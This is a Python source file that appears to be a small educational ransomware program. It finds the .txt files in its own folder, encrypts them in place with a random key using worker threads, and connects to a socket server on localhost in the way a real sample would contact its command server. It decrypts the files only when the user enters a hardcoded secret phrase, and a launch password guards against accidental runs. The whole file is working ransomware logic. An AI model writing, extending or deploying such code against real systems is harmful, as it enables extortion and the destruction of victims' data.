import os
import socket
import threading
import queue
import random
from encrypt import encrypt
from decrypt import decrypt


# List of file paths in path
def file_paths(path):

    files = []
    code_files = ["maze.py", "decrypt.py", "encrypt.py", "README.md", ".gitignore"]
    for file in os.listdir(path):

        # Ignore code files
        if file in code_files:  #sys.argv[0] == 'script.py'
            continue

        file_path = os.path.join(path, file)

        # Only considering text files
        if os.path.isfile(file_path) and file.endswith(".txt"):
            files.append(file_path)

    return files


# Encrypt files
def encrypt_files(key, path):
    
    encrypted_files = 0
    file_path = file_paths(path)

    q = queue.Queue()

    # enter files in queue
    for file in file_path:
        q.put(file)
        encrypted_files += 1


    def func():
        while q.not_empty:
            try:
                file = q.get()
                # Load the content of file
                with open(file, 'r') as f:
                    content = f.read()

                # Encrypt data
                encrypted_data = encrypt(content, key)

                # Rewrite the encrypted data
                with open(file, 'w') as f:
                    f.write(encrypted_data)
            except:
                print(f'Failed to encrypt file {file}')

            q.task_done()
    
    # use thread to encrypt
    for i in range(2):
        thread = threading.Thread(target=func, daemon=True)
        thread.start()

    q.join()  # checks for if threads completed the task (q.task_done())

    return encrypted_files


# Decrypt files
def decrypt_files(key, path):
    
    decrypted_files = 0
    file_path = file_paths(path)

    q = queue.Queue()

    # enter files in queue
    for file in file_path:
        q.put(file)
        decrypted_files += 1


    def func():
        while q.not_empty:
            file = q.get()

            # Load the content of file
            with open(file, 'r') as f:
                content = f.read()

            # Decrypt data
            decrypted_data = decrypt(content, key)

            # Rewrite the decrypted data
            with open(file, 'w') as f:
                content = f.write(decrypted_data)
            
            q.task_done()

    # use thread to decrypt
    for i in range(2):
        thread = threading.Thread(target=func, daemon=True)
        thread.start()

    q.join() 

    return decrypted_files


# Generate Key
def generate_key():

    key_length = 128 // 8

    # employing char pool (every combination possible in 8bit)
    char_pool = ''
    for ch in range(1, 126):
        char_pool += chr(ch)


    # designing the key
    key = ''
    for i in range(key_length):
        key += random.choice(char_pool)

    return key


# MAIN FUNCTION 
if __name__ == '__main__':


    # Safeguard against running into your own computer
    safeguard = input('Enter the password to run: ')
    if(safeguard != 'initiate'):
        quit()


    # random key is generated every time
    key = generate_key()

    # client host name
    hostname = os.getenv('COMPUTERNAME')

    SERVER_IP = 'localhost' 
    SERVER_PORT = 5678
    FORMAT = 'utf-8'

    # establishing connection with socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        
        # connect
        s.connect((SERVER_IP, SERVER_PORT))

        # receive
        data = s.recv(1024).decode(FORMAT)
        print(data)


    # Encrypt file (same folder)
    path = os.path.dirname(os.path.abspath(__file__))
    count = encrypt_files(key, path)
    print(f'Number of encrypted files: {count}')


    # Decrypt files
    secret_phrase = "Don't let the muggles get you down"
    user_phrase = input('Enter the secret phrase: ')    

    if(user_phrase == secret_phrase):
        decrypt_files(key, path)
    else:    
        print("Sorry, wrong phrase!")